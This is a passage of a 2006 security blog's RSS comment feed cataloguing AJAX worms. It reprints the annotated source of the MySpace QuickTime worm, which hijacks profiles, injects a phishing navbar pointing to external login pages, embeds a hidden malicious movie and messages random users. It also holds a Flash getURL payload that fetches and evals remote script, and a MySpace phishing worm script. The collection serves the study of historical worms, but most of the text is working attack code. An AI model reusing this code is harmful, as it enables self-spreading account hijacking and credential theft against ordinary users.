+			headlinetext  = '';
+		}
+
+        //Checking if this profile already has a reference to the quicktime movie, and thus if has this profile
+        //already been infected. This is used later
+		var c = moviestext.indexOf("piAF2iuswo.mov");
+
+		var urlpost = 'http://' + document.location.host + '/Modules/ProfileEdit/Pages/Interests.aspx?fuseaction=profile.interests';
+
+        //Update the profile with our infected content
+        //Note that all the controls start with the same prefix. The author could have
+        //stored this prefix in a string to make the virus smaller.
+		var postinfo = "__VIEWSTATE=" + theviewstate
+		+ "&#038;ctl00%24ctl00%24Main%24ProfileEditContent%24editInterests%24hash=" + thehash
+		+ "&#038;ctl00%24ctl00%24Main%24ProfileEditContent%24editInterests%24SaveTop=Save+All+Changes"
+		+ "&#038;ctl00%24ctl00%24Main%24ProfileEditContent%24editInterests%24HeadlineText=" + headlinetext
+		//Here the HTML for the top menu with Phishing links is inserted into the profile
+		+ "&#038;ctl00%24ctl00%24Main%24ProfileEditContent%24editInterests%24AboutMeText=" + aboutmetext + cc[0]
+		+ "&#038;ctl00%24ctl00%24Main%24ProfileEditContent%24editInterests%24LikeToMeetText=" + liketomeettext
+		+ "&#038;ctl00%24ctl00%24Main%24ProfileEditContent%24editInterests%24GeneralText=" + generaltext
+		+ "&#038;ctl00%24ctl00%24Main%24ProfileEditContent%24editInterests%24MusicText=" + musictext
+		//Here a reference to the quicktime movie is inserted
+		+ "&#038;ctl00%24ctl00%24Main%24ProfileEditContent%24editInterests%24MoviesText=" + moviestext + cc[3]
+		+ "&#038;ctl00%24ctl00%24Main%24ProfileEditContent%24editInterests%24TelevisionText=" + televisiontext
+		+ "&#038;ctl00%24ctl00%24Main%24ProfileEditContent%24editInterests%24BooksText=" + bookstext
+		+ "&#038;ctl00%24ctl00%24Main%24ProfileEditContent%24editInterests%24HeroesText=" + heroestext;
+
+        //The author is checking if this profile has already been infected. Really, this check should have been
+        //perform at the start of function. This would have made the virus faster by not having to perform
+        //needless string operations.
+		if(-1 == c) {
+		    //if profile has not been infected, update the profile with infected content.
+			editProf.connect(urlpost,"POST",postinfo,friendsWrapper);
+		}
+	}
+};
+
+/*
+ doMessage - Tries to send a message to another MySpace user
+             with a link to a pornographic website
+params: none
+returns: void
+
+*/
+function domessage() {
+    //for all the iframes that were created to send a message
+    for(var y=0;y&lt;ap.length;y++) {
+	    if(-1!=window.frames['qtkt'+y].document.body.innerHTML.indexOf('ctl00$ctl00$Main$Main$sendMessageControl$subjectTextBox')) {
+	        //populate the subject with a random message
+		    window.frames['qtkt'+y].document.forms[1].ctl00$ctl00$Main$Main$sendMessageControl$subjectTextBox.value=su[Math.floor(6*(Math.random()%1))];
+			//insert a pornographic picture which links to a pornographic website
+			window.frames['qtkt'+y].document.forms[1].ctl00$ctl00$Main$Main$sendMessageControl$bodyTextBox.value=cc[2];
+
+			//The below line of code would send the message to a MySpace user.
+			//in the copy of the code I received, this line was commented out
+			//because of this, it appear the worm didn't actually send the messages
+
+			//window.frames['qtkt'+y].document.forms[1].btnSend.click();
+        }
+    }
+}
+
+/*
+findContents - Extracts a substring that occurs between two other strings
+params:
+    oXML - An XHConn object which has returned a response
+    start - first string to look for
+    end - string to find that occurs after the start string
+    offset - offset between the two string to begin extracting at
+
+returns: Extracted contents or an empty string
+
+*/
+var findContents=function(oXML,start,end,offset){
+	var s,e,n;
+	s=oXML.responseText.indexOf(start)
+	//only keep looking if we found the start string
+	if(-1!=s) {
+		e=oXML.responseText.indexOf(end,s);
+		n=oXML.responseText.substring(s+offset,e);
+        //this undoes an HTML entity conversion, because the text was reflected inside a Textbox and
+        //had entities applied to it when returned from MySpace
+		return n.replace(/&lt;/g,"&lt;").replace(/&gt;/g,"&gt;").replace(/&quot;/g,"\"").replace(/&amp;/g,"&#038;");
+	}
+	return '';
+};
+
+/*
+friendsWrapper - Unknown. The source code I received simply had an empty function
+                 with a comment. This might just exist because a callback function
+                 is needed for the XmlHttpRequest that is made to update the profile
+
+*/
+var friendsWrapper=function(oXML){
+	// removed for now
+}
+
+/*
+XHConn - Creates a new XHConn object, which extends the XmlHttpRequest object. It
+         handles creating an XHR in a cross platform manner, and creates a wrapper
+         that handles onreadystatechange.
+
+returns: XHConn object
+
+*/
+function XHConn() {
+    //this may be a mistake, because these variables
+    //are declared as global variables instead of properties
+    //of the XHConn object
+	var xmlhttp, bComplete = false;
+
+    //Create XHR, regardless of browser
+	try { xmlhttp = new ActiveXObject("Msxml2.XMLHTTP"); }
+	catch(e) {
+		try { xmlhttp = new ActiveXObject("Microsoft.XMLHTTP"); }
+		catch(e) {
+			try { xmlhttp = new XMLHttpRequest(); }
+			catch(e) { xmlhttp = false; }
+		}
+	}
+	if(!xmlhttp) return null;
+
+	/*adds a connect method
+
+	  params:
+	    sURL - URL to send request to
+	    sMethod - HTTP method to use, if not GET, assumes POST
+	    sVars - PARAMETERS
+	    fnDone - function to callback once connection is completed
+	*/
+	this.connect = function(sURL, sMethod, sVars, fnDone) {
+		if(!xmlhttp) return false;
+		bComplete = false;
+		sMethod = sMethod.toUpperCase();
+		try {
+		    //if it is a get, we send no parameters
+			if(sMethod == "GET") {
+				xmlhttp.open(sMethod, sURL, true)
+				sVars = "";
+			} else {
+			    //else sent the appropriate headers for a POST
+				xmlhttp.open(sMethod, sURL, true);
+				xmlhttp.setRequestHeader("Method","POST "+sURL+" HTTP/1.1");
+				xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+			}
+			//Wrap the onreadystatechange and make sure that that the request has completly returned
+			xmlhttp.onreadystatechange = function() {
+			    //normally a check for statuscode == 200 is done here, but for some reason they didn't
+				if(xmlhttp.readyState == 4 &#038;&#038; !bComplete) {
+					bComplete = true;
+					fnDone(xmlhttp);
+				}
+			};
+			//send the request
+			xmlhttp.send(sVars);
+		} catch(z) { return false; }
+		return true;
+	};
+	return this;
+}
+
+//========================================================
+//======================================================== Global Variables
+//========================================================
+
+//the content the worm needed (Phishing pages, malicious Quicktime movie, JavaScript code, etc)
+//was stored on multiple servers. The worm randomly selects one to use
+var ll=new Array();
+ll[0]='http://www.daviddraftsystem.com/images/';
+ll[1]='http://www.tm-group.co.uk/images/';
+var lll=ll[Math.floor(2*(Math.random()%1))];
+
+//this is an array containing different phrases to use as the subject of a message to other MySpace
+//users
+var su=new Array();
+su[0]='what else is there to do on a Sunday.?.......';
+su[1]='You better not forget about this..';
+su[2]='Hehe that was so funny..';
+su[3]='better see this one last time lol..';
+su[4]='omg did you see this last nite..';
+su[5]='whos coming to the party tonight.?..';
+
+//This array contains various payloads used by the worm
+var cc=new Array();
+//This is the HTML used to hide the old top menu bar and replace it with a menu pointing to a fake login page
+cc[0]='&lt;style type="text/css"&gt;\n'
++'div table td font { display: none }\n'
++'div div table tr td a.navbar, div div table tr td font { display: none }\n'
++'.testnav { position:absolute; top: 136px; left:50%; _top: 146px }\n'
++'&lt;/style&gt;&lt;div style="z-index:5; background-color: #6698CB; margin-left:-400px; width: 800px" align="center" class="testnav"&gt;&lt;div style=""&gt;'
++'&lt;a href="'+lll+'login.html" target="" class="navbar"&gt;Home&lt;/a&gt; | &lt;a href="'+lll+'login.html" target="" class="navbar"&gt;Browse&lt;/a&gt; | '
++'&lt;a href="'+lll+'login.html" target="" class="navbar"&gt;Search&lt;/a&gt; | &lt;a href="'+lll+'login.html" target="" class="navbar"&gt;Invite&lt;/a&gt; | '
++'&lt;a href="'+lll+'login.html" target="" class="navbar"&gt;Film&lt;/a&gt; | &lt;a href="'+lll+'login.html" target="" class="navbar"&gt;Mail&lt;/a&gt; | '
++'&lt;a href="'+lll+'login.html" target="" class="navbar"&gt;Blog&lt;/a&gt; | &lt;a href="'+lll+'login.html" target="" class="navbar"&gt;Favorites&lt;/a&gt; | '
++'&lt;a href="'+lll+'login.html" target="" class="navbar"&gt;Forum&lt;/a&gt; | &lt;a href="'+lll+'login.html" target="" class="navbar"&gt;Groups&lt;/a&gt; | '
++'&lt;a href="'+lll+'login.html" target="" class="navbar"&gt;Events&lt;/a&gt; | &lt;a href="'+lll+'login.html" target="" class="navbar"&gt;Videos&lt;/a&gt; | '
++'&lt;a href="'+lll+'login.html" target="" class="navbar"&gt;Music&lt;/a&gt; | &lt;a href="'+lll+'login.html" target="" class="navbar"&gt;Comedy&lt;/a&gt; | '
++'&lt;a href="'+lll+'login.html" target="" class="navbar"&gt;Classifieds&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;'; //profile
+//This is the body of the message sent to other MySpace users. It contains a pornographic picture and a link to a pornographic website
+cc[2]='&lt;a href="http://google.com/url?q=http://www.vidchicks.com/home.php"&gt;&lt;img border="0" src="http://img453.imageshack.us/img453/5603/youtubedt7rf2.jpg"&gt;'; //mesages
+//This is HTML added to a profile with a link to the malicious Quicktime movie. It uses styles to try and hide itself from the user
+cc[3]='&lt;div style="width: 1px; height: 1px; overflow: hidden; text-indent: -9999px"&gt;&lt;embed src='+lll+'piAF2iuswo.mov /&gt;&lt;/div&gt;'; // profile inf
+
+//========================================================
+//======================================================== Code Execution Starts Here
+//========================================================
+
+//Please note that all variables declared here are global variables, as
+//JavaScript does not have block level variable scope. This allows functions
+//like doMessages() to access variables created here.
+
+// Malware will execute only if variable editProf is not defined.
+// Once the worm runs it defines this variable. This serves as a kill switch
+// by preventing the virus from running multiple times on the same page
+if((typeof editProf == "undefined") &#038;&#038; (top == self)) {
+	var ap=new Array(4);
+	var fi=new Array(4);
+    //This code picks 4 MySpace users at random and sets up code to
+    //send them a message
+	for(var x=0;x&lt;ap.length;x++) {
+	    //randomly generate a friend ID
+		var ran_unrounded=80000000+(105000000-80000000)*Math.random();
+		var ran_number=Math.floor(ran_unrounded);
+		fi[x]=ran_number;
+        //build a hidden iFrame. This will be used to send a message to a MySpace user
+		ap[x]=document.createElement('iframe');
+		ap[x].height=1;
+		ap[x].width=1;
+		ap[x].name="qtkt"+x;
+		ap[x].id="qtkt"+x;
+		document.getElementsByTagName('body')[0].appendChild(ap[x]);
+		ap[x].src='http://profile.myspace.com/index.cfm?fuseaction=mail.message&#038;friendID='+fi[x];
+	}
+    //In 6 seconds, execute the domessage() function. this will (try) to send messages to the randomly
+    //selected people.
+	setTimeout("domessage()",6000);
+    //create a new instance of XHconn. This also prevents the worm from running again on the same page
+	var editProf = new XHConn();
+    //Go fetch a the edit page for the user's profile and call the doEdit() function when you receive a response
+	editProf.connect('http://'+document.location.host+'/Modules/ProfileEdit/Pages/Interests.aspx',"GET","",doEdit);
+}</code></pre>
+<p>MySpace, QuickTime, QTL, MOV, GNUCITIZEN</p>
+]]></content:encoded>
+	</item>
+	<item>
+		<title>By: pdp</title>
+		<link>http://www.gnucitizen.org/blog/wormx/comment-page-1/#comment-1013</link>
+		<dc:creator>pdp</dc:creator>
+		<pubDate>Thu, 07 Dec 2006 05:46:30 +0000</pubDate>
+		<guid isPermaLink="false">http://www.gnucitizen.org/blog/ajax-worm-database#comment-1013</guid>
+		<description>&lt;h3&gt;The infamous MySpace Flash Worm&lt;/h3&gt;
+
+&lt;p&gt;The worm works by emebeding flash content that opens a URL once the movie is in action. This is achieved via &quot;getURL&quot; method. The getURL redirects the user to a blog page where another flash component opens a javascript URL that is evaluated inside MySpace context. More information about this worm can be found &lt;a href=&quot;http://blog.taragana.com/index.php/archive/how-myspace-flash-ajax-hack-works/&quot; rel=&quot;nofollow&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;state1: open remote URL&lt;/em&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;getURL(&quot;url&quot;);&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;em&gt;stage2: evaluate a javascript URL&lt;/em&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;getURL(&quot;javas\n\rcript: var x = new ActiveXObject(\&#039;Msxml2.XMLHTTP\&#039;);x.open(\&#039;GET\&#039;,\&#039;
+http://editprofile.myspace.com/index.cfm?fuseaction=user.HomeComments&amp;friendID=93634373\&#039;,true);
+x.onreadystatechange=function(){if (x.readyState==4){var pg=x.responseText;var sc=pg.substring(pg.indexOf(\&#039;BX-\&#039;)+3,pg.indexOf(\&#039;-EX\&#039;));while((sc.indexOf(\&#039;&lt;br&gt;\&#039;)!=-1)&#124;&#124;(sc.indexOf(\&#039;-XXX\&#039;)!=-1)){var n=sc.indexOf(\&#039;&lt;br&gt;\&#039;);if(n==-1)n=sc.indexOf(\&#039;-XXX\&#039;);sc=sc.substring(0,n)+sc.substring(n+5,sc.length);};&quot; + &quot;eval(sc);}};&quot; + &quot;x.send(null);&quot;, &quot;&quot;);&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;MySpace, flash, getURL&lt;/p&gt;</description>
+		<content:encoded><![CDATA[<h3>The infamous MySpace Flash Worm</h3>
+<p>The worm works by emebeding flash content that opens a URL once the movie is in action. This is achieved via &#8220;getURL&#8221; method. The getURL redirects the user to a blog page where another flash component opens a javascript URL that is evaluated inside MySpace context. More information about this worm can be found <a href="http://blog.taragana.com/index.php/archive/how-myspace-flash-ajax-hack-works/" rel="nofollow">here</a>.</p>
+<p><em>state1: open remote URL</em></p>
+<pre><code>getURL("url");</code></pre>
+<p><em>stage2: evaluate a javascript URL</em></p>
+<pre><code>getURL("javas\n\rcript: var x = new ActiveXObject(\'Msxml2.XMLHTTP\');x.open(\'GET\',\'
+<a href="http://editprofile.myspace.com/index.cfm?fuseaction=user.HomeComments&#038;friendID=93634373" rel="nofollow">http://editprofile.myspace.com.....D=93634373</a>\',true);
+x.onreadystatechange=function(){if (x.readyState==4){var pg=x.responseText;var sc=pg.substring(pg.indexOf(\'BX-\')+3,pg.indexOf(\'-EX\'));while((sc.indexOf(\'&lt;br&gt;\')!=-1)||(sc.indexOf(\'-XXX\')!=-1)){var n=sc.indexOf(\'&lt;br&gt;\');if(n==-1)n=sc.indexOf(\'-XXX\');sc=sc.substring(0,n)+sc.substring(n+5,sc.length);};" + "eval(sc);}};" + "x.send(null);", "");</code></pre>
+<p>MySpace, flash, getURL</p>
+]]></content:encoded>
+	</item>
+	<item>
+		<title>By: pdp</title>
+		<link>http://www.gnucitizen.org/blog/wormx/comment-page-1/#comment-1012</link>
+		<dc:creator>pdp</dc:creator>
+		<pubDate>Thu, 07 Dec 2006 05:23:03 +0000</pubDate>
+		<guid isPermaLink="false">http://www.gnucitizen.org/blog/ajax-worm-database#comment-1012</guid>
+		<description>&lt;h3&gt;Random MySpace Phish Worm&lt;/h3&gt;
+
+&lt;p&gt;This is something picked up from packetstorm, a MySpace phish worm.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;var up_sURL=&quot;http://cache.static.userplane.com/presence&quot;;
+var up_dURL=&quot;http://feed.presence.userplane.com/presence&quot;;
+var up_wmURL=&quot;http://www.myspace.com/userplane/ic.cfm&quot;;
+var up_pServ=&quot;presence.userplane.com&quot;;
+function up_launch(_1){
+up_ow[_1]=up_ow[_1]==undefined?null:up_ow[_1];
+if(up_ow[_1]==null&#124;&#124;up_ow[_1].opener==undefined){
+up_ow[_1]=window.open(up_wmURL+&quot;?sendType=3&amp;strEncryptedID=&quot;+up_sid+&quot;&amp;strDestinationUserID=&quot;+_1,&quot;ICWindow_&quot;+_1,&quot;width=500,height=475,toolbar=0,directories=0,menubar=0,status=0,location=0,scrollbars=0,resizable=1&quot;);
+if(up_ow[_1]==null){
+up_notify(_1);
+}else{
+up_clear(_1,false);
+}
+}
+}
+function up_clear(_2,_3){
+var l=up_la;
+up_la=new Array();
+var _5=false;
+while(l.length&gt;0){
+var _6=l.pop();
+if(_6.uid!=_2){
+up_la.push(_6);
+}else{
+_5=true;
+}
+}
+if(_5&#124;&#124;!_3){
+frames[&quot;up_lf&quot;].location.href=up_dURL+&quot;/o.php?sid=&quot;+up_sid+&quot;&amp;ou=&quot;+_2+&quot;&amp;forceClear=&quot;+(_3?&quot;true&quot;:&quot;false&quot;);
+}
+up_show();
+}
+function up_notify(_7){
+var _8=true;
+for(var i=0;i&lt;up_la.length;i++){
+if(up_la[i].uid==_7){
+_8=false;
+}
+}
+if(_8){
+var _a=new Object();
+_a.uid=_7;
+_a.n=&quot;A website member&quot;;
+up_la.push(_a);
+}
+up_show();
+}
+function up_show(){
+var e=document.getElementById(&quot;up_nd&quot;);
+if(up_la.length&gt;0){
+if(up_uid_display!=up_la[0].uid){
+e.innerHTML=&quot;&lt;div style=\&quot;text-align:center\&quot;&gt;&quot;+(up_is_win_ie?&quot;&quot;:&quot;&lt;table width=\&quot;100%\&quot; border=\&quot;0\&quot; cellpadding=\&quot;0\&quot; cellspacing=\&quot;0\&quot;&gt;&lt;tr&gt;&lt;td align=\&quot;center\&quot;&gt;&quot;)+&quot;&lt;table border=\&quot;0\&quot; cellpadding=\&quot;2\&quot; cellspacing=\&quot;5\&quot;&gt;&lt;tr&gt;&lt;td nowrap align=\&quot;center\&quot;&gt;&lt;strong style=\&quot;font-size:larger;\&quot;&gt;Incoming IM Message&lt;/strong&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=\&quot;center\&quot;&gt;&quot;+up_la[0].n+&quot; wants to IM you.&lt;br&gt;Would you like to accept?&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td nowrap align=\&quot;center\&quot;&gt;&lt;a style=\&quot;font-size:larger;\&quot; href=\&quot;\&quot; onClick=\&quot;javascript: up_launch( &#039;&quot;+up_la[0].uid+&quot;&#039; ); return false;\&quot;&gt;Yes&lt;/a&gt; &#160; &#160; &#160; &#160; &#160; &lt;a style=\&quot;font-size:larger;\&quot; href=\&quot;\&quot; onClick=\&quot;javascript: up_clear( &#039;&quot;+up_la[0].uid+&quot;&#039;, true ); return false;\&quot;&gt;No&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&quot;+(up_is_win_ie?&quot;&quot;:&quot;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&quot;)+&quot;&lt;/div&gt;&quot;;
+up_uid_display=up_la[0].uid;
+up_animate(200);
+}
+}else{
+up_uid_display=&quot;&quot;;
+up_animate(-200);
+}
+}
+function up_animate(dY){
+var e=document.getElementById(&quot;up_nd&quot;);
+if(up_divY!=dY&#124;&#124;up_la.length&gt;0){
+if(up_divY!=dY){
+up_divY+=dY&lt;up_divY?-10:10;
+}
+var px=up_divY+document.body.scrollTop+&quot;px&quot;;
+e.style.top=px;
+clearTimeout(up_at);
+up_at=setTimeout(&quot;up_animate(&quot;+dY+&quot;)&quot;,33);
+}else{
+e.style.top=dY;
+}
+}
+function up_clean(_f){
+var _10=&quot;&quot;;
+for(var i=0;i&lt;_f.length;i++){
+var c=_f.charAt(i);
+if((c&gt;=&quot;A&quot;&amp;&amp;c&lt;=&quot;Z&quot;)&#124;&#124;(c&gt;=&quot;a&quot;&amp;&amp;c&lt;=&quot;z&quot;)&#124;&#124;(c&gt;=&quot;0&quot;&amp;&amp;c&lt;=&quot;9&quot;)){
+_10+=c;
+}else{
+_10+=&quot;_&quot;;
+}
+}
+return _10;
+}
+function receiveData(_13){
+if(_13!=&quot;&quot;){
+var a=_13.split(&quot;,&quot;);
+if(a.length&gt;0){
+while(u=a.shift()){
+up_launch(u);
+}
+}
+}
+}
+function URLencode(_15){
+return escape(_15).replace(/\+/g,&quot;%2B&quot;).replace(/\&quot;/g,&quot;%22&quot;).replace(/\&#039;/g,&quot;%27&quot;).replace(/\//g,&quot;%2F&quot;);
+}
+function up_runPresence(sid,uid){
+up_sid=URLencode(sid);
+up_divY=-200;
+up_la=new Array();
+up_ow=new Object();
+up_uid_display=&quot;&quot;;
+document.write(&quot;&lt;iframe name=\&quot;up_lf\&quot; id=\&quot;up_lf\&quot; style=\&quot;position:absolute; top: -200px; z-index:9998; width:100px; height:100px; border: 0px\&quot; src=\&quot;\&quot;&gt;&lt;/iframe&gt;&quot;);
+document.write(&quot;&lt;div id=\&quot;up_nd\&quot; style=\&quot;position:absolute; width:250px; z-index:111111; left: 30px; top: -200px; background-color:#eeeeee; border: 1px solid #000000;\&quot;&gt;&lt;/div&gt;&quot;);
+if(up_sid!=&quot;&quot;){
+var _18=&quot;server=&quot;+up_pServ+&quot;&amp;uid=&quot;+up_sid;
+document.write(&quot;&lt;div id=\&quot;flash\&quot; style=\&quot;position:absolute; width:100px; z-index:9996; top: -200px;\&quot;&gt;&lt;object classid=\&quot;clsid:d27cdb6e-ae6d-11cf-96b8-444553540000\&quot; codebase=\&quot;http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,0,0\&quot; id=\&quot;presence\&quot; width=\&quot;1\&quot; height=\&quot;1\&quot; align=\&quot;middle\&quot;&gt;&lt;param name=\&quot;allowScriptAccess\&quot; value=\&quot;anyDomain\&quot; /&gt;&lt;param name=\&quot;movie\&quot; value=\&quot;&quot;+up_sURL+&quot;/presence.swf\&quot; /&gt;&lt;param name=\&quot;quality\&quot; value=\&quot;high\&quot; /&gt;&lt;param name=\&quot;bgcolor\&quot; value=\&quot;#ffffff\&quot; /&gt;&lt;param name=\&quot;flashvars\&quot; value=\&quot;&quot;+_18+&quot;\&quot; /&gt;&lt;embed src=\&quot;&quot;+up_sURL+&quot;/presence.swf\&quot; flashvars=\&quot;&quot;+_18+&quot;\&quot; quality=\&quot;high\&quot; bgcolor=\&quot;#ffffff\&quot; width=\&quot;1\&quot; height=\&quot;1\&quot; swLiveConnect=true id=\&quot;presence\&quot; name=\&quot;presence\&quot; align=\&quot;middle\&quot; allowScriptAccess=\&quot;anyDomain\&quot; type=\&quot;application/x-shockwave-flash\&quot; pluginspage=\&quot;http://www.macromedia.com/go/getflashplayer\&quot; /&gt;&lt;/object&gt;&lt;/div&gt;&quot;);
+}
+}
+var up_sid=null;
+var up_divY=null;
+var up_la=null;
+var up_uid_display=null;
+var up_at=null;
+var up_ow=null;
+var up_agt=navigator.userAgent.toLowerCase();
+var up_appVer=navigator.appVersion.toLowerCase();
+var up_is_mac=up_agt.indexOf(&quot;mac&quot;)!=-1;
+var up_is_safari=up_agt.indexOf(&quot;safari&quot;)!=-1&amp;&amp;up_is_mac;
+var up_is_khtml=up_is_safari&#124;&#124;up_agt.indexOf(&quot;konqueror&quot;)!=-1;
+var up_is_ie=up_appVer.indexOf(&quot;msie&quot;)!=-1&amp;&amp;up_agt.indexOf(&quot;opera&quot;)==-1&amp;&amp;!up_is_khtml;
+var up_is_win=up_is_mac?false:(up_agt.indexOf(&quot;win&quot;)!=-1&#124;&#124;up_agt.indexOf(&quot;16bit&quot;)!=-1);
+var up_is_win_ie=up_is_win&amp;&amp;up_is_ie;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;MySpace, phishing&lt;/p&gt;</description>
+		<content:encoded><![CDATA[<h3>Random MySpace Phish Worm</h3>
+<p>This is something picked up from packetstorm, a MySpace phish worm.</p>
+<pre><code>var up_sURL="http://cache.static.userplane.com/presence";
+var up_dURL="http://feed.presence.userplane.com/presence";
+var up_wmURL="http://www.myspace.com/userplane/ic.cfm";
+var up_pServ="presence.userplane.com";
+function up_launch(_1){
+up_ow[_1]=up_ow[_1]==undefined?null:up_ow[_1];
+if(up_ow[_1]==null||up_ow[_1].opener==undefined){
+up_ow[_1]=window.open(up_wmURL+"?sendType=3&#038;strEncryptedID="+up_sid+"&#038;strDestinationUserID="+_1,"ICWindow_"+_1,"width=500,height=475,toolbar=0,directories=0,menubar=0,status=0,location=0,scrollbars=0,resizable=1");
+if(up_ow[_1]==null){
+up_notify(_1);
+}else{
+up_clear(_1,false);
+}
+}
+}
+function up_clear(_2,_3){
+var l=up_la;
+up_la=new Array();
+var _5=false;
+while(l.length&gt;0){
+var _6=l.pop();
+if(_6.uid!=_2){
+up_la.push(_6);
+}else{
+_5=true;
+}
+}
+if(_5||!_3){
+frames["up_lf"].location.href=up_dURL+"/o.php?sid="+up_sid+"&#038;ou="+_2+"&#038;forceClear="+(_3?"true":"false");
+}
+up_show();
+}
+function up_notify(_7){
+var _8=true;
+for(var i=0;i&lt;up_la.length;i++){
+if(up_la[i].uid==_7){
+_8=false;
+}
+}
+if(_8){
+var _a=new Object();
+_a.uid=_7;
+_a.n="A website member";
+up_la.push(_a);
+}
+up_show();
+}
+function up_show(){
+var e=document.getElementById("up_nd");
+if(up_la.length&gt;0){
+if(up_uid_display!=up_la[0].uid){
+e.innerHTML="&lt;div style=\"text-align:center\"&gt;"+(up_is_win_ie?"":"&lt;table width=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\"&gt;&lt;tr&gt;&lt;td align=\"center\"&gt;")+"&lt;table border=\"0\" cellpadding=\"2\" cellspacing=\"5\"&gt;&lt;tr&gt;&lt;td nowrap align=\"center\"&gt;&lt;strong style=\"font-size:larger;\"&gt;Incoming IM Message&lt;/strong&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=\"center\"&gt;"+up_la[0].n+" wants to IM you.&lt;br&gt;Would you like to accept?&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td nowrap align=\"center\"&gt;&lt;a style=\"font-size:larger;\" href=\"\" onClick=\"javascript: up_launch( '"+up_la[0].uid+"' ); return false;\"&gt;Yes&lt;/a&gt; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &lt;a style=\"font-size:larger;\" href=\"\" onClick=\"javascript: up_clear( '"+up_la[0].uid+"', true ); return false;\"&gt;No&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;"+(up_is_win_ie?"":"&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;")+"&lt;/div&gt;";
+up_uid_display=up_la[0].uid;
+up_animate(200);
+}
+}else{
+up_uid_display="";
+up_animate(-200);
+}
+}
+function up_animate(dY){
+var e=document.getElementById("up_nd");
+if(up_divY!=dY||up_la.length&gt;0){
+if(up_divY!=dY){
+up_divY+=dY&lt;up_divY?-10:10;
+}
+var px=up_divY+document.body.scrollTop+"px";
+e.style.top=px;
+clearTimeout(up_at);
+up_at=setTimeout("up_animate("+dY+")",33);
+}else{
+e.style.top=dY;
+}
+}
+function up_clean(_f){
+var _10="";
+for(var i=0;i&lt;_f.length;i++){
+var c=_f.charAt(i);
+if((c&gt;="A"&#038;&#038;c&lt;="Z")||(c&gt;="a"&#038;&#038;c&lt;="z")||(c&gt;="0"&#038;&#038;c&lt;="9")){
+_10+=c;
+}else{
+_10+="_";
+}
+}
+return _10;
+}
+function receiveData(_13){
+if(_13!=""){
+var a=_13.split(",");
+if(a.length&gt;0){
+while(u=a.shift()){
+up_launch(u);
+}
+}
+}
+}
+function URLencode(_15){
+return escape(_15).replace(/\+/g,"%2B").replace(/\"/g,"%22").replace(/\'/g,"%27").replace(/\//g,"%2F");
+}
+function up_runPresence(sid,uid){
+up_sid=URLencode(sid);
+up_divY=-200;
+up_la=new Array();
+up_ow=new Object();
+up_uid_display="";
+document.write("&lt;iframe name=\"up_lf\" id=\"up_lf\" style=\"position:absolute; top: -200px; z-index:9998; width:100px; height:100px; border: 0px\" src=\"\"&gt;&lt;/iframe&gt;");
+document.write("&lt;div id=\"up_nd\" style=\"position:absolute; width:250px; z-index:111111; left: 30px; top: -200px; background-color:#eeeeee; border: 1px solid #000000;\"&gt;&lt;/div&gt;");
+if(up_sid!=""){
+var _18="server="+up_pServ+"&#038;uid="+up_sid;
+document.write("&lt;div id=\"flash\" style=\"position:absolute; width:100px; z-index:9996; top: -200px;\"&gt;&lt;object classid=\"clsid:d27cdb6e-ae6d-11cf-96b8-444553540000\" codebase=\"http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,0,0\" id=\"presence\" width=\"1\" height=\"1\" align=\"middle\"&gt;&lt;param name=\"allowScriptAccess\" value=\"anyDomain\" /&gt;&lt;param name=\"movie\" value=\""+up_sURL+"/presence.swf\" /&gt;&lt;param name=\"quality\" value=\"high\" /&gt;&lt;param name=\"bgcolor\" value=\"#ffffff\" /&gt;&lt;param name=\"flashvars\" value=\""+_18+"\" /&gt;&lt;embed src=\""+up_sURL+"/presence.swf\" flashvars=\""+_18+"\" quality=\"high\" bgcolor=\"#ffffff\" width=\"1\" height=\"1\" swLiveConnect=true id=\"presence\" name=\"presence\" align=\"middle\" allowScriptAccess=\"anyDomain\" type=\"application/x-shockwave-flash\" pluginspage=\"http://www.macromedia.com/go/getflashplayer\" /&gt;&lt;/object&gt;&lt;/div&gt;");
+}
+}
+var up_sid=null;
+var up_divY=null;
+var up_la=null;
+var up_uid_display=null;
+var up_at=null;
+var up_ow=null;
+var up_agt=navigator.userAgent.toLowerCase();
+var up_appVer=navigator.appVersion.toLowerCase();
+var up_is_mac=up_agt.indexOf("mac")!=-1;
+var up_is_safari=up_agt.indexOf("safari")!=-1&#038;&#038;up_is_mac;
+var up_is_khtml=up_is_safari||up_agt.indexOf("konqueror")!=-1;
+var up_is_ie=up_appVer.indexOf("msie")!=-1&#038;&#038;up_agt.indexOf("opera")==-1&#038;&#038;!up_is_khtml;
+var up_is_win=up_is_mac?false:(up_agt.indexOf("win")!=-1||up_agt.indexOf("16bit")!=-1);
+var up_is_win_ie=up_is_win&#038;&#038;up_is_ie;
+</code></pre>
+<p>MySpace, phishing</p>
+]]></content:encoded>
+	</item>
+	<item>
+		<title>By: pdp</title>
+		<link>http://www.gnucitizen.org/blog/wormx/comment-page-1/#comment-1008</link>
+		<dc:creator>pdp</dc:creator>
+		<pubDate>Thu, 07 Dec 2006 03:39:37 +0000</pubDate>
+		<guid isPermaLink="false">http://www.gnucitizen.org/blog/ajax-worm-database#comment-1008</guid>
+		<description>&lt;h3&gt;Samy&lt;/h3&gt;
+
